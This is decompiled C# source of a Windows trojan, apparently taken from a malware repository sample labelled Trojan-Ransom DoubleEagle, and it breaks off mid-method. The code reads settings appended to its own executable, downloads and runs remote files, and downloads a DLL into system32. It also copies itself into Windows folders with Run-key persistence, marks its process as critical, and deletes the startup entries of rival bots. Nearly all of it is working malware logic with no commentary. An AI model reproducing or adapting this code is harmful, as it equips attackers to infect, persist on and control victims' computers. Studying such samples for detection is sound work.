// Decompiled with JetBrains decompiler
// Type: datav.Form1
// Assembly: datav, Version=1.2.3.1, Culture=neutral, PublicKeyToken=null
// MVID: 62ACF508-799B-4A60-859B-EB406379EBBF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.DoubleEagle.gw-a758debd627be0a7841059f2c3c176ba1d8878874b8aefc9ab3bcc6532f2fdfb.exe

using datav.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace datav
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    [AccessedThroughProperty("TextBox3")]
    private TextBox _TextBox3;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("TextBox4")]
    private TextBox _TextBox4;
    [AccessedThroughProperty("TextBox6")]
    private TextBox _TextBox6;
    [AccessedThroughProperty("TextBox5")]
    private TextBox _TextBox5;
    [AccessedThroughProperty("TextBox7")]
    private TextBox _TextBox7;
    [AccessedThroughProperty("TextBox8")]
    private TextBox _TextBox8;
    [AccessedThroughProperty("TextBox9")]
    private TextBox _TextBox9;
    [AccessedThroughProperty("TextBox10")]
    private TextBox _TextBox10;
    [AccessedThroughProperty("TextBox11")]
    private TextBox _TextBox11;
    [AccessedThroughProperty("TextBox12")]
    private TextBox _TextBox12;
    [AccessedThroughProperty("TextBox13")]
    private TextBox _TextBox13;
    [AccessedThroughProperty("TextBox14")]
    private TextBox _TextBox14;
    [AccessedThroughProperty("TextBox15")]
    private TextBox _TextBox15;
    [AccessedThroughProperty("TextBox16")]
    private TextBox _TextBox16;
    [AccessedThroughProperty("TextBox17")]
    private TextBox _TextBox17;
    [AccessedThroughProperty("TextBox18")]
    private TextBox _TextBox18;
    [AccessedThroughProperty("TextBox19")]
    private TextBox _TextBox19;
    [AccessedThroughProperty("TextBox20")]
    private TextBox _TextBox20;
    [AccessedThroughProperty("TextBox21")]
    private TextBox _TextBox21;
    [AccessedThroughProperty("TextBox22")]
    private TextBox _TextBox22;
    [AccessedThroughProperty("TextBox23")]
    private TextBox _TextBox23;
    [AccessedThroughProperty("TextBox24")]
    private TextBox _TextBox24;
    [AccessedThroughProperty("TextBox25")]
    private TextBox _TextBox25;
    [AccessedThroughProperty("TextBox26")]
    private TextBox _TextBox26;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("WebBrowser1")]
    private WebBrowser _WebBrowser1;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    [AccessedThroughProperty("ListView1")]
    private ListView _ListView1;
    private string statuscritique;
    private string botkill;
    private string libri;
    private string hidefilms;
    private string checkck;
    private const int WM_COMMAND = 273;
    private const int MF_ENABLED = 0;
    private const int LVM_FIRST = 4096;
    private const int LVM_DELETEITEM = 4104;
    private const int LVM_SORTITEMS = 4144;
    private const int MF_GRAYED = 1;
    private string urlweb;
    private string downlibri;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.TextBox1 = new TextBox();
      this.TextBox2 = new TextBox();
      this.TextBox3 = new TextBox();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.TextBox4 = new TextBox();
      this.TextBox6 = new TextBox();
      this.TextBox5 = new TextBox();
      this.TextBox7 = new TextBox();
      this.TextBox8 = new TextBox();
      this.TextBox9 = new TextBox();
      this.TextBox10 = new TextBox();
      this.TextBox11 = new TextBox();
      this.TextBox12 = new TextBox();
      this.TextBox13 = new TextBox();
      this.TextBox14 = new TextBox();
      this.TextBox15 = new TextBox();
      this.TextBox16 = new TextBox();
      this.TextBox17 = new TextBox();
      this.TextBox18 = new TextBox();
      this.TextBox19 = new TextBox();
      this.TextBox20 = new TextBox();
      this.TextBox21 = new TextBox();
      this.TextBox22 = new TextBox();
      this.TextBox23 = new TextBox();
      this.TextBox24 = new TextBox();
      this.TextBox25 = new TextBox();
      this.TextBox26 = new TextBox();
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.WebBrowser1 = new WebBrowser();
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.ListView1 = new ListView();
      this.SuspendLayout();
      TextBox textBox1_1 = this.TextBox1;
      Point point1 = new Point(12, 2);
      Point point2 = point1;
      textBox1_1.Location = point2;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      Size size1 = new Size(100, 20);
      Size size2 = size1;
      textBox1_2.Size = size2;
      this.TextBox1.TabIndex = 0;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(12, 41);
      Point point3 = point1;
      textBox2_1.Location = point3;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(100, 20);
      Size size3 = size1;
      textBox2_2.Size = size3;
      this.TextBox2.TabIndex = 1;
      TextBox textBox3_1 = this.TextBox3;
      point1 = new Point(12, 80);
      Point point4 = point1;
      textBox3_1.Location = point4;
      this.TextBox3.Name = "TextBox3";
      TextBox textBox3_2 = this.TextBox3;
      size1 = new Size(100, 20);
      Size size4 = size1;
      textBox3_2.Size = size4;
      this.TextBox3.TabIndex = 2;
      TextBox textBox4_1 = this.TextBox4;
      point1 = new Point(100, 106);
      Point point5 = point1;
      textBox4_1.Location = point5;
      this.TextBox4.Name = "TextBox4";
      TextBox textBox4_2 = this.TextBox4;
      size1 = new Size(100, 20);
      Size size5 = size1;
      textBox4_2.Size = size5;
      this.TextBox4.TabIndex = 3;
      TextBox textBox6_1 = this.TextBox6;
      point1 = new Point(131, 80);
      Point point6 = point1;
      textBox6_1.Location = point6;
      this.TextBox6.Name = "TextBox6";
      TextBox textBox6_2 = this.TextBox6;
      size1 = new Size(100, 20);
      Size size6 = size1;
      textBox6_2.Size = size6;
      this.TextBox6.TabIndex = 4;
      TextBox textBox5_1 = this.TextBox5;
      point1 = new Point(-30, 106);
      Point point7 = point1;
      textBox5_1.Location = point7;
      this.TextBox5.Name = "TextBox5";
      TextBox textBox5_2 = this.TextBox5;
      size1 = new Size(100, 20);
      Size size7 = size1;
      textBox5_2.Size = size7;
      this.TextBox5.TabIndex = 5;
      TextBox textBox7_1 = this.TextBox7;
      point1 = new Point(106, 160);
      Point point8 = point1;
      textBox7_1.Location = point8;
      this.TextBox7.Name = "TextBox7";
      TextBox textBox7_2 = this.TextBox7;
      size1 = new Size(100, 20);
      Size size8 = size1;
      textBox7_2.Size = size8;
      this.TextBox7.TabIndex = 6;
      TextBox textBox8_1 = this.TextBox8;
      point1 = new Point(0, 149);
      Point point9 = point1;
      textBox8_1.Location = point9;
      this.TextBox8.Name = "TextBox8";
      TextBox textBox8_2 = this.TextBox8;
      size1 = new Size(100, 20);
      Size size9 = size1;
      textBox8_2.Size = size9;
      this.TextBox8.TabIndex = 7;
      TextBox textBox9_1 = this.TextBox9;
      point1 = new Point(106, 12);
      Point point10 = point1;
      textBox9_1.Location = point10;
      this.TextBox9.Name = "TextBox9";
      TextBox textBox9_2 = this.TextBox9;
      size1 = new Size(100, 20);
      Size size10 = size1;
      textBox9_2.Size = size10;
      this.TextBox9.TabIndex = 8;
      TextBox textBox10_1 = this.TextBox10;
      point1 = new Point(85, 54);
      Point point11 = point1;
      textBox10_1.Location = point11;
      this.TextBox10.Name = "TextBox10";
      TextBox textBox10_2 = this.TextBox10;
      size1 = new Size(100, 20);
      Size size11 = size1;
      textBox10_2.Size = size11;
      this.TextBox10.TabIndex = 9;
      TextBox textBox11_1 = this.TextBox11;
      point1 = new Point(76, 121);
      Point point12 = point1;
      textBox11_1.Location = point12;
      this.TextBox11.Name = "TextBox11";
      TextBox textBox11_2 = this.TextBox11;
      size1 = new Size(100, 20);
      Size size12 = size1;
      textBox11_2.Size = size12;
      this.TextBox11.TabIndex = 10;
      TextBox textBox12_1 = this.TextBox12;
      point1 = new Point(0, 0);
      Point point13 = point1;
      textBox12_1.Location = point13;
      this.TextBox12.Name = "TextBox12";
      TextBox textBox12_2 = this.TextBox12;
      size1 = new Size(100, 20);
      Size size13 = size1;
      textBox12_2.Size = size13;
      this.TextBox12.TabIndex = 11;
      TextBox textBox13_1 = this.TextBox13;
      point1 = new Point(85, 38);
      Point point14 = point1;
      textBox13_1.Location = point14;
      this.TextBox13.Name = "TextBox13";
      TextBox textBox13_2 = this.TextBox13;
      size1 = new Size(100, 20);
      Size size14 = size1;
      textBox13_2.Size = size14;
      this.TextBox13.TabIndex = 12;
      TextBox textBox14_1 = this.TextBox14;
      point1 = new Point(0, 0);
      Point point15 = point1;
      textBox14_1.Location = point15;
      this.TextBox14.Name = "TextBox14";
      TextBox textBox14_2 = this.TextBox14;
      size1 = new Size(100, 20);
      Size size15 = size1;
      textBox14_2.Size = size15;
      this.TextBox14.TabIndex = 13;
      TextBox textBox15_1 = this.TextBox15;
      point1 = new Point(25, 80);
      Point point16 = point1;
      textBox15_1.Location = point16;
      this.TextBox15.Name = "TextBox15";
      TextBox textBox15_2 = this.TextBox15;
      size1 = new Size(100, 20);
      Size size16 = size1;
      textBox15_2.Size = size16;
      this.TextBox15.TabIndex = 14;
      TextBox textBox16_1 = this.TextBox16;
      point1 = new Point(0, 0);
      Point point17 = point1;
      textBox16_1.Location = point17;
      this.TextBox16.Name = "TextBox16";
      TextBox textBox16_2 = this.TextBox16;
      size1 = new Size(100, 20);
      Size size17 = size1;
      textBox16_2.Size = size17;
      this.TextBox16.TabIndex = 15;
      TextBox textBox17_1 = this.TextBox17;
      point1 = new Point(8, 8);
      Point point18 = point1;
      textBox17_1.Location = point18;
      this.TextBox17.Name = "TextBox17";
      TextBox textBox17_2 = this.TextBox17;
      size1 = new Size(100, 20);
      Size size18 = size1;
      textBox17_2.Size = size18;
      this.TextBox17.TabIndex = 16;
      TextBox textBox18_1 = this.TextBox18;
      point1 = new Point(16, 16);
      Point point19 = point1;
      textBox18_1.Location = point19;
      this.TextBox18.Name = "TextBox18";
      TextBox textBox18_2 = this.TextBox18;
      size1 = new Size(100, 20);
      Size size19 = size1;
      textBox18_2.Size = size19;
      this.TextBox18.TabIndex = 17;
      TextBox textBox19_1 = this.TextBox19;
      point1 = new Point(0, 0);
      Point point20 = point1;
      textBox19_1.Location = point20;
      this.TextBox19.Name = "TextBox19";
      TextBox textBox19_2 = this.TextBox19;
      size1 = new Size(100, 20);
      Size size20 = size1;
      textBox19_2.Size = size20;
      this.TextBox19.TabIndex = 18;
      TextBox textBox20_1 = this.TextBox20;
      point1 = new Point(0, 0);
      Point point21 = point1;
      textBox20_1.Location = point21;
      this.TextBox20.Name = "TextBox20";
      TextBox textBox20_2 = this.TextBox20;
      size1 = new Size(100, 20);
      Size size21 = size1;
      textBox20_2.Size = size21;
      this.TextBox20.TabIndex = 19;
      TextBox textBox21_1 = this.TextBox21;
      point1 = new Point(8, 8);
      Point point22 = point1;
      textBox21_1.Location = point22;
      this.TextBox21.Name = "TextBox21";
      TextBox textBox21_2 = this.TextBox21;
      size1 = new Size(100, 20);
      Size size22 = size1;
      textBox21_2.Size = size22;
      this.TextBox21.TabIndex = 20;
      TextBox textBox22_1 = this.TextBox22;
      point1 = new Point(0, 0);
      Point point23 = point1;
      textBox22_1.Location = point23;
      this.TextBox22.Name = "TextBox22";
      TextBox textBox22_2 = this.TextBox22;
      size1 = new Size(100, 20);
      Size size23 = size1;
      textBox22_2.Size = size23;
      this.TextBox22.TabIndex = 21;
      TextBox textBox23_1 = this.TextBox23;
      point1 = new Point(0, 0);
      Point point24 = point1;
      textBox23_1.Location = point24;
      this.TextBox23.Name = "TextBox23";
      TextBox textBox23_2 = this.TextBox23;
      size1 = new Size(100, 20);
      Size size24 = size1;
      textBox23_2.Size = size24;
      this.TextBox23.TabIndex = 22;
      TextBox textBox24_1 = this.TextBox24;
      point1 = new Point(0, 0);
      Point point25 = point1;
      textBox24_1.Location = point25;
      this.TextBox24.Name = "TextBox24";
      TextBox textBox24_2 = this.TextBox24;
      size1 = new Size(100, 20);
      Size size25 = size1;
      textBox24_2.Size = size25;
      this.TextBox24.TabIndex = 23;
      TextBox textBox25_1 = this.TextBox25;
      point1 = new Point(0, 0);
      Point point26 = point1;
      textBox25_1.Location = point26;
      this.TextBox25.Name = "TextBox25";
      TextBox textBox25_2 = this.TextBox25;
      size1 = new Size(100, 20);
      Size size26 = size1;
      textBox25_2.Size = size26;
      this.TextBox25.TabIndex = 24;
      TextBox textBox26_1 = this.TextBox26;
      point1 = new Point(0, 0);
      Point point27 = point1;
      textBox26_1.Location = point27;
      this.TextBox26.Name = "TextBox26";
      TextBox textBox26_2 = this.TextBox26;
      size1 = new Size(100, 20);
      Size size27 = size1;
      textBox26_2.Size = size27;
      this.TextBox26.TabIndex = 25;
      WebBrowser webBrowser1_1 = this.WebBrowser1;
      point1 = new Point(0, 67);
      Point point28 = point1;
      webBrowser1_1.Location = point28;
      WebBrowser webBrowser1_2 = this.WebBrowser1;
      size1 = new Size(20, 20);
      Size size28 = size1;
      webBrowser1_2.MinimumSize = size28;
      this.WebBrowser1.Name = "WebBrowser1";
      WebBrowser webBrowser1_3 = this.WebBrowser1;
      size1 = new Size(250, 250);
      Size size29 = size1;
      webBrowser1_3.Size = size29;
      this.WebBrowser1.TabIndex = 26;
      ListView listView1_1 = this.ListView1;
      point1 = new Point(0, 0);
      Point point29 = point1;
      listView1_1.Location = point29;
      this.ListView1.Name = "ListView1";
      ListView listView1_2 = this.ListView1;
      size1 = new Size(121, 97);
      Size size30 = size1;
      listView1_2.Size = size30;
      this.ListView1.TabIndex = 27;
      this.ListView1.UseCompatibleStateImageBehavior = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(104, 87);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.ListView1);
      this.Controls.Add((Control) this.WebBrowser1);
      this.Controls.Add((Control) this.TextBox26);
      this.Controls.Add((Control) this.TextBox25);
      this.Controls.Add((Control) this.TextBox24);
      this.Controls.Add((Control) this.TextBox23);
      this.Controls.Add((Control) this.TextBox22);
      this.Controls.Add((Control) this.TextBox21);
      this.Controls.Add((Control) this.TextBox20);
      this.Controls.Add((Control) this.TextBox19);
      this.Controls.Add((Control) this.TextBox18);
      this.Controls.Add((Control) this.TextBox17);
      this.Controls.Add((Control) this.TextBox16);
      this.Controls.Add((Control) this.TextBox15);
      this.Controls.Add((Control) this.TextBox14);
      this.Controls.Add((Control) this.TextBox13);
      this.Controls.Add((Control) this.TextBox12);
      this.Controls.Add((Control) this.TextBox11);
      this.Controls.Add((Control) this.TextBox10);
      this.Controls.Add((Control) this.TextBox9);
      this.Controls.Add((Control) this.TextBox8);
      this.Controls.Add((Control) this.TextBox7);
      this.Controls.Add((Control) this.TextBox5);
      this.Controls.Add((Control) this.TextBox6);
      this.Controls.Add((Control) this.TextBox4);
      this.Controls.Add((Control) this.TextBox3);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.TextBox1);
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox TextBox1
    {
      get => this._TextBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual TextBox TextBox2
    {
      get => this._TextBox2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    internal virtual TextBox TextBox3
    {
      get => this._TextBox3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox3 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Timer1 = value;
    }

    internal virtual TextBox TextBox4
    {
      get => this._TextBox4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox4 = value;
    }

    internal virtual TextBox TextBox6
    {
      get => this._TextBox6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox6 = value;
    }

    internal virtual TextBox TextBox5
    {
      get => this._TextBox5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox5 = value;
    }

    internal virtual TextBox TextBox7
    {
      get => this._TextBox7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox7 = value;
    }

    internal virtual TextBox TextBox8
    {
      get => this._TextBox8;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox8 = value;
    }

    internal virtual TextBox TextBox9
    {
      get => this._TextBox9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox9 = value;
    }

    internal virtual TextBox TextBox10
    {
      get => this._TextBox10;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox10 = value;
    }

    internal virtual TextBox TextBox11
    {
      get => this._TextBox11;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox11 = value;
    }

    internal virtual TextBox TextBox12
    {
      get => this._TextBox12;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox12 = value;
    }

    internal virtual TextBox TextBox13
    {
      get => this._TextBox13;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox13 = value;
    }

    internal virtual TextBox TextBox14
    {
      get => this._TextBox14;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox14 = value;
    }

    internal virtual TextBox TextBox15
    {
      get => this._TextBox15;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox15 = value;
    }

    internal virtual TextBox TextBox16
    {
      get => this._TextBox16;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox16 = value;
    }

    internal virtual TextBox TextBox17
    {
      get => this._TextBox17;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox17 = value;
    }

    internal virtual TextBox TextBox18
    {
      get => this._TextBox18;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox18 = value;
    }

    internal virtual TextBox TextBox19
    {
      get => this._TextBox19;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox19 = value;
    }

    internal virtual TextBox TextBox20
    {
      get => this._TextBox20;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox20 = value;
    }

    internal virtual TextBox TextBox21
    {
      get => this._TextBox21;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox21 = value;
    }

    internal virtual TextBox TextBox22
    {
      get => this._TextBox22;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox22 = value;
    }

    internal virtual TextBox TextBox23
    {
      get => this._TextBox23;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox23 = value;
    }

    internal virtual TextBox TextBox24
    {
      get => this._TextBox24;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox24 = value;
    }

    internal virtual TextBox TextBox25
    {
      get => this._TextBox25;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox25 = value;
    }

    internal virtual TextBox TextBox26
    {
      get => this._TextBox26;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox26 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      get => this._Timer2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual WebBrowser WebBrowser1
    {
      get => this._WebBrowser1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._WebBrowser1 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      get => this._Timer3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    internal virtual ListView ListView1
    {
      get => this._ListView1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ListView1 = value;
    }

    [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int apiFindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

    [DllImport("user32", EntryPoint = "FindWindowExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int apiFindWindowEx(
      int hWnd1,
      int hWnd2,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz1,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz2);

    [DllImport("user32", EntryPoint = "EnableWindow", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool apiEnableWindow(int hwnd, int fEnable);

    [DllImport("user32", EntryPoint = "GetMenu", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int apiGetMenu(int hwnd);

    [DllImport("user32", EntryPoint = "GetSubMenu", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int apiGetSubMenu(int hMenu, int nPos);

    [DllImport("user32", EntryPoint = "GetMenuItemID", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int apiGetMenuItemID(int hMenu, int nPos);

    [DllImport("user32", EntryPoint = "EnableMenuItem", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int apiEnableMenuItem(int hMenu, int wIDEnableItem, int wEnable);

    [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int apiSendMessage(int hWnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lParam);

    [DllImport("user32", EntryPoint = "GetDesktopWindow", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int apiGetDesktopWindow();

    [DllImport("user32", EntryPoint = "LockWindowUpdate", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int apiLockWindowUpdate(int hwndLock);

    private static int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength)
    {
      int num;
      return num;
    }

    public void LOL()
    {
      try
      {
        string Expression = System.IO.File.ReadAllText(Application.ExecutablePath);
        if (!Expression.Contains("FileSplit"))
          return;
        string[] strArray = Strings.Split(Expression, "FileSplit");
        int num1 = Information.UBound((Array) strArray);
        int num2 = 1;
        while (num2 <= num1)
        {
          this.TextBox1.Text = strArray[1];
          this.TextBox2.Text = strArray[2];
          this.TextBox3.Text = strArray[3];
          this.TextBox6.Text = strArray[4];
          this.TextBox5.Text = strArray[5];
          this.TextBox7.Text = strArray[6];
          this.TextBox8.Text = strArray[7];
          this.TextBox9.Text = strArray[8];
          this.TextBox12.Text = strArray[9];
          this.TextBox13.Text = strArray[10];
          this.TextBox14.Text = strArray[11];
          this.TextBox15.Text = strArray[12];
          this.TextBox16.Text = strArray[13];
          this.TextBox17.Text = strArray[14];
          this.TextBox18.Text = strArray[15];
          this.TextBox19.Text = strArray[16];
          this.TextBox20.Text = strArray[17];
          this.TextBox21.Text = strArray[18];
          this.TextBox22.Text = strArray[19];
          this.TextBox23.Text = strArray[20];
          this.TextBox24.Text = strArray[21];
          this.TextBox25.Text = strArray[22];
          this.TextBox26.Text = strArray[23];
          this.statuscritique = strArray[24];
          this.botkill = strArray[25];
          this.libri = strArray[26];
          this.downlibri = strArray[27];
          this.urlweb = strArray[28];
          this.checkck = strArray[29];
          checked { ++num2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void pizaa()
    {
      if (System.IO.File.Exists(this.TextBox2.Text + this.TextBox3.Text))
        System.IO.File.Delete(this.TextBox2.Text + this.TextBox3.Text);
      try
      {
        MyProject.Computer.Network.DownloadFile(this.TextBox1.Text, this.TextBox2.Text + this.TextBox3.Text);
        Process.Start(this.TextBox2.Text + this.TextBox3.Text);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void Installs()
    {
      try
      {
        if (Operators.CompareString(this.TextBox6.Text, "1", false) == 0)
        {
          System.IO.File.Copy(Application.ExecutablePath, "C:\\Windows\\Temp\\" + this.TextBox5.Text + ".exe");
          try
          {
            RegistryKey subKey = MyProject.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            subKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            subKey.SetValue(this.TextBox5.Text, (object) ("C:\\Windows\\Temp\\" + this.TextBox5.Text + ".exe"));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(this.TextBox7.Text, "1", false) == 0)
        {
          System.IO.File.Copy(Application.ExecutablePath, "C:\\Windows\\" + this.TextBox5.Text + ".exe");
          try
          {
            RegistryKey subKey = MyProject.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            subKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            subKey.SetValue(this.TextBox5.Text, (object) ("C:\\Windows\\" + this.TextBox5.Text + ".exe"));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Operators.CompareString(this.TextBox8.Text, "1", false) != 0)
          return;
        System.IO.File.Copy(Application.ExecutablePath, "C:\\Windows\\System32\\" + this.TextBox5.Text + ".exe");
        try
        {
          RegistryKey subKey = MyProject.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
          subKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          subKey.SetValue(this.TextBox5.Text, (object) ("C:\\Windows\\System32\\" + this.TextBox5.Text + ".exe"));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void critiqueprocess()
    {
      if (Operators.CompareString(this.statuscritique, "1", false) != 0)
        return;
      Process.EnterDebugMode();
      IntPtr handle = Process.GetCurrentProcess().Handle;
      int num = 1;
      ref int local = ref num;
      Form1.NtSetInformationProcess(handle, 29, ref local, 4);
    }

    public void dlllibrairy()
    {
      try
      {
        if (Operators.CompareString(this.libri, "1", false) != 0)
          return;
        MyProject.Computer.Network.DownloadFile(this.downlibri, "C:\\WINDOWS\\system32\\Mozsqlite3.dll");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void PGP() => this.WebBrowser1.Navigate(this.urlweb);

    public void checktask()
    {
      if (Operators.CompareString(this.checkck, "1", false) != 0)
        return;
      this.Timer3.Start();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        this.LOL();
        this.botkills();
        this.checktask();
        this.pizaa();
        this.EmailN();
        this.Installs();
        this.PGP();
        this.critiqueprocess();
        this.persit();
        this.CacherFichier();
        this.Timer2.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void botkillv()
    {
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("Windows Update");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("Winupdate");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("svchost");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("javaw");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("Audio");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("DarkCometRAT");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("msnmsgsr");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("DanyHost");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("Updater");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("winlogon");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").DeleteValue("winupdater");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").DeleteValue("explorer");
    }

    public void botclean()
